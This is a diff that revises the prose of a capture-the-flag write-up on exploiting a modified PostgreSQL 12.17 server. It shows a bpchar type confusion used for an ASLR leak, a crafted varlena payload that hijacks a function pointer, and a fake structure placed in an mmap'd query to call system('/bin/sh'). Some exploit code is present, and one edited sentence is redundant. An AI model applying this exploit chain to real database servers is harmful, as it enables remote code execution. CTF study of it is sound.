@@ -40,7 +40,7 @@ We are given with multiple files:
 
 After checking them we see that author wants us to pwn `postgres 12.17` that was extended by custom functionality. Connecting to the remote gives us a possibility to run arbitrary SQL query, but we cannot create/modify anything.
 
-Unfortunately code changes weren't provided, so we need to figure out them ourselves. That's easy - just compile `postgres` using `Dockerfile` that author provided and do a binary diff:
+Unfortunately code changes weren't provided, so we need to figure them out ourselves. That's easy - just compile `postgres` using `Dockerfile` that author provided and do a binary diff:
 
 ![bindiff](./bindiff.png)
 
@@ -113,8 +113,7 @@ __int64 __fastcall varchar_sum(FunctionCallInfo fcinfo)
 }
 ```
 
-These functions are similar but... different. They just sum values after trying converting them to doubles. Varchar one uses `pg_detoast_datum` and `text_to_cstring` functions. A bit of googling tells us that functions are related to TOAST'ed data. More can be found in [postgres docs](https://www.postgresql.org/docs/12/storage-toast.html). So...
-
+These functions are similar but... different. They simply sum values after attempting to convert them to doubles. Varchar one uses `pg_detoast_datum` and `text_to_cstring` functions. A bit of googling tells us that these functions are related to *toasted* data. More information can be found in the [postgres docs](https://www.postgresql.org/docs/12/storage-toast.html). So...
 
 ## Where is a bug?
 
@@ -132,9 +131,9 @@ postgres=> select proname,prosrc from pg_proc where prosrc in ('varchar_sum', 'c
 (5 rows)
 ```
 
-We see that sum functions related to types: `bpchar`, `text` and `bytea` are also using `varchar_sum` implementation. Quick look in the docs, and we know that `bpchar` is not a *toastable* type, so probably using `varchar_sum` for it is a bad idea...
+We observe that sum functions related to types such as `bpchar`, `text`, and `bytea` also utilize the `varchar_sum` implementation. A quick look in the documentation reveals that `bpchar` is not a *toastable* type, so using `varchar_sum` for it is likely a bad idea...
 
-Setting a breakpoint at the beginning of `varchar_sum` confirm the thesis (it is important to attach to pid that query `SELECT pg_backend_pid();` returns). Let's see what is being passed to `pg_detoast_datum` after executing the following query: `select bpchar_sum('1', 'AABBCCDD');`
+Setting a breakpoint at the beginning of `varchar_sum` confirm the thesis (it is important to attach to pid that query `SELECT pg_backend_pid();` returns). Let's examine what is being passed to `pg_detoast_datum` after executing the following query: `select bpchar_sum('1', 'AABBCCDD');`
 
 ```c
    0x556a617052e8 <varchar_sum+40>    mov    rdi, qword ptr [rdi + 0x30]
@@ -199,8 +198,7 @@ ERROR:  	/lib/x86_64-linux-gnu/libc.so.6(+0x1529a0) [0x7f4d470719a0]
 
 Good news is that connection wasn't closed, so when we execute next query the addresses will stay the same. ASLR leak? Done. Now is the harder part - memory write.
 
-
-Diving into a new huge codebase is not an easy task. We tried to focus on `varlena` related functions. It is even worse, a lot of complicated C macros are on our way. Nevertheless, we delved into `pg_detoast_datum` and things that can be called from it. `heap_tuple_untoast_attr` was a first candidate, looks like it is parsing our data and returns freshly allocated memory filled with parsed data. We analyzed almost every branch that was doing memory allocation - nothing fancy. However, there is one branch that calls another parse function on our data - `heap_tuple_fetch_attr`. It has very interesting branch inside:
+Diving into a new, extensive codebase is no easy task. Our focus shifted towards functions related to `varlena`. It is even worse, a lot of complicated C macros are on our way. However, we encountered the complexity of numerous C macros. Undeterred, we delved into `pg_detoast_datum` and its callable functions. Among them, `heap_tuple_untoast_attr` emerged as an initial candidate, appearing to parse our data and return freshly allocated memory filled with parsed data. We analyzed almost every branch that was doing memory allocation - nothing fancy. However, one branch caught our attention, it calls another parse function on our data - `heap_tuple_fetch_attr`. It has very interesting branch inside:
 
 ```c
 	else if (VARATT_IS_EXTERNAL_EXPANDED(attr))
@@ -219,6 +217,7 @@ Diving into a new huge codebase is not an easy task. We tried to focus on `varle
 ```
 
 relevant code fragments:
+
 ```c
 typedef uintptr_t Datum;
 
@@ -260,12 +259,13 @@ EOH_get_flat_size(ExpandedObjectHeader *eohptr)
 }
 ```
 
-Considering above code - we are able to fully control `ptr` variable in `DatumGetEOHP` function, so effectively we have a control over `get_flat_size` function pointer that is called just after `DatumGetEOHP` leading to arbitrary function call.
+Considering the code above - we are able to fully control `ptr` variable in `DatumGetEOHP` function, so effectively we have a control over `get_flat_size` function pointer that is called just after `DatumGetEOHP`, leading to arbitrary function call.
 
 In order to call `EOH_get_flat_size` we have to construct our payload in the following way:
-- first byte of our payload needs to be set to `0x01` - this is to satisfy `VARATT_IS_EXTERNAL_EXPANDED` macro in `heap_tuple_untoast_attr` function
-- second byte has to be `0x02` to pass `VARATT_IS_EXTERNAL_EXPANDED` check and call `DatumGetEOHP`
-- six bytes of address that will be copied to `ptr` variable. The trick is that we cannot use null bytes in our payload, so we have to rely on the fact that upper two bytes of pointer will be zeroed (which is not always the case)
+
+- the first byte of our payload needs to be set to `0x01` - this is to satisfy `VARATT_IS_EXTERNAL_EXPANDED` macro in `heap_tuple_untoast_attr` function
+- the second byte has to be `0x02` to pass `VARATT_IS_EXTERNAL_EXPANDED` check and call `DatumGetEOHP`
+- the next six bytes should represent the address that will be copied to the `ptr` variable. The trick is that we cannot use null bytes in our payload, so we have to rely on the fact that upper two bytes of pointer will be zeroed (which may not always be the case)
 
 Quick look on `EOH_get_flat_size` assembly:
 ```
@@ -275,7 +275,7 @@ Dump of assembler code for function EOH_get_flat_size:
    0x0000556a61659624 <+4>:	jmp    QWORD PTR [rax]
 ```
 
-`rdi` is the part that we control. In order to get code execution we have to point `rdi+8` to the address that after dereferencing would give us a function address. Unfortunately we don't know any heap address, so we cannot craft anything on heap. Fortunately, we are able to create and send a huge query string `postgres` will use `malloc` to allocate memory for our string, so if it would be big enough `malloc` will use `mmap` for creating a chunk, and it will be located at known offset from `libc`. We can verify that using the following python code:
+The `rdi` is the part that we control. To achieve code execution, we need to ensure that the address at `rdi+8`, after dereferencing, points to a valid function address. Unfortunately we don't have information about the heap address, so we cannot craft anything on heap. Fortunately, we are able to create and send a huge query string. `postgres` will use `malloc` to allocate memory for our string, so if it would be big enough `malloc` will use `mmap` for creating a memory chunk, and it will be located at known offset from `libc` (we know its address!). We can verify that using the following python code:
 
 ```python
 import psycopg2
@@ -326,9 +326,9 @@ pwndbg> dist 0x7f87a74e3000 0x7f87945ce04c
 0x7f87a74e3000->0x7f87945ce04c is -0x12f14fb4 bytes (-0x25e29f7 words)
 ```
 
-We have our offset now, and we can easily calculate address where our "fake" structure will be stored. Now it is enough to craft it.
+We have our offset now, and we can easily calculate address where our "fake" structure will be stored. Crafting it is the next step.
 
-First attempt was to call `system` with `/bin/sh` (or `one_gadget` in general). Used the following code (extended python script):
+In the initial attempt, we tried to call `system` with `/bin/sh`. The following code was used (extended python script used before):
 
 ```py
 def probe():
@@ -358,34 +358,7 @@ pwndbg> p/x $rdi
 $1 = 0xd2007fc626c1404c
 ```
 
-`rdi` has wrong MSB - it happens sometimes. To avoid such problem it is enough to just run some random SQL queries before executing our payload.
-
-
-```py
-SYSTEM = 0x4c3a0
-
-def probe():
-    conn.commit(); cur = conn.cursor()
-    cur.execute(b"SELECT repeat('1s0', 1000)") # fix rdi MSB
-
-    fake_struct = flat(
-        b'/bin/sh\x00',
-        p64(rdi+0x10), # point to address below
-        p64(libc_base+SYSTEM)
-    )
-
-    cur.execute(flat(
-        b"SELECT '\\x",
-        b'deadbeef', # add 4B padding to align rest of payload to 8B
-        fake_struct.hex().encode(),
-        b'aaaaaaaa' * 0x400000,
-        b"'::bytea, bpchar_sum('1', '",
-        payload.strip(b'\x00'), # no null bytes allowed
-        b"')"
-    ))
-```
-
-quick check in `gdb`:
+`rdi` has wrong MSB - it happens sometimes. To avoid such problem it is enough to just run some random SQL queries before executing our payload. Having that fixed we can do a quick check in `gdb`:
 
 ```c
  RDI  0x7f879964f050 ◂— 0x68732f6e69622f /* '/bin/sh' */
